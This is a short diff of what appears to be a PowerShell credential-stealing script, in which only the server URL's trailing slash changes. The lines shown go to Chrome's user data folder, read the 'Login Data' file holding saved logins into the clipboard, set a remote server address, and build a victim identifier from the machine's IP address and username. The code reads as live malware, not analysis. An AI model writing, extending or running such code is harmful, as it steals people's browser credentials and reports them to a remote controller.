@@ -1,6 +1,6 @@
  cd AppData\Local\Google\"Chrome"\"User Data"\Default 
  set-clipboard (get-content 'Login Data.txt')
-$server = 'http://192.168.1.41:5060/'
+$server = 'http://192.168.1.41:5060'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
